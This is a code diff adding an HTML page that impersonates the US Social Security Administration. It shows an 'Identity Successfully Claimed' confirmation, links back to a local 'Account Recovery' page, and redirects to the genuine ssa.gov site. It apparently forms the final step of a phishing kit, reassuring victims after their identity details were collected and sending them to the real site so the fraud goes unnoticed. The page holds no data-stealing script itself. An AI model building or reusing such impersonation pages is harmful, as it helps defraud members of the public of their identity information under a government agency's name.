@@ -1,0 +1,65 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<!-- Favicon -->
+  <link rel="icon" href="ssa.png" type="image/x-icon">
+  <link rel="icon" type="image/png" sizes="32x32" href="ssa.png">
+  <link rel="apple-touch-icon" sizes="180x180" href="ssa.png">
+<title>Account re-enabled | SSA</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --accent:#0b6eff;
+    --muted:#6b7280;
+    --bg:#f7faff;
+    --card:#ffffff;
+    --radius:14px;
+    font-family:Inter,system-ui;
+  }
+  body{margin:0;background:var(--bg);color:#111;display:flex;align-items:center;justify-content:center;height:100vh;padding:20px;}
+  .box{
+    background:var(--card);
+    padding:32px;
+    max-width:480px;
+    width:100%;
+    border-radius:var(--radius);
+    box-shadow:0 8px 24px rgba(0,0,40,0.06);
+    text-align:center;
+  }
+  .checkmark{
+    width:64px;height:64px;border-radius:50%;
+    background:#e4f0ff;
+    margin:0 auto 18px;
+    display:flex;align-items:center;justify-content:center;
+    font-size:32px;color:var(--accent);font-weight:700;
+  }
+  h1{margin:0 0 8px;font-size:1.5rem;}
+  p{margin:0;color:var(--muted);font-size:.95rem;line-height:1.45;}
+  .btn{padding:14px;width:100%;border:none;border-radius:12px;margin-top:20px;font-size:1rem;font-weight:600;cursor:pointer;}
+  .btn-primary{background:var(--accent);color:white;}
+  .btn-ghost{background:transparent;border:1px solid #d7e7ff;color:var(--accent);}
+</style>
+</head>
+<body>
+
+<div class="box">
+  <div class="checkmark">✔️</div>
+
+  <h1>Identity Successfully Claimed</h1>
+  <p>
+    Your identification has been verified and your account is now active  
+    and securely stored in our system. You can now close this page.
+  </p>
+
+  <button class="btn btn-primary" onclick="location.href='https://www.ssa.gov/myaccount/?gad_source=1&gad_campaignid=174388179&gbraid=0AAAAADx5V9Xh8PB2QL9iSJo3_6PuNV1rM&gclid=Cj0KCQiArOvIBhDLARIsAPwJXOZlrFIaPBcBTkVff5IpRkbNYbyq6cDREq1fmcdxfHz9tK9bZMi3DXUaAupGEALw_wcB'">
+    Continue to SSA Home
+  </button>
+  <button class="btn btn-ghost" onclick="location.href='greet-page.html'">
+    Return To Account Recovery
+  </button>
+</div>
+
+</body>
+</html>
